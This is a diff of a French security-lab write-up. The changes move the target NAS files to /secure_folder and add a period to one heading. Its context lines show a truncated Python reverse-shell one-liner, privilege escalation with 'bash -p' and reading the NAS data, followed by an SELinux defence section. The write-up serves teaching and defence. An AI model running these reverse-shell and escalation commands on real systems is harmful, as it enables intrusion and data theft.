@@ -49,7 +49,7 @@ python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=
 
 ### Vulnérabilité du système d'exploitation
 
-Il faut montrer que l'utilisateur est ``postgress`` et que les NAS sont dans ``/nas.txt`` :
+Il faut montrer que l'utilisateur est ``postgress`` et que les NAS sont dans ``/secure_folder/nas.txt`` :
 ```bash
 whoami
 ls -lsa /
@@ -88,7 +88,7 @@ bash -p
 Il est maintenant possible d'accéder au NAS :
 ```bash
 whoami
-cat /nas.csv
+cat /secure_folder/nas.csv
 ```
 
 ## Défense
@@ -116,4 +116,4 @@ sudo setenforce 1
 sestatus
 ```
 
-**Relancer l'attaque**
+**Relancer l'attaque.**
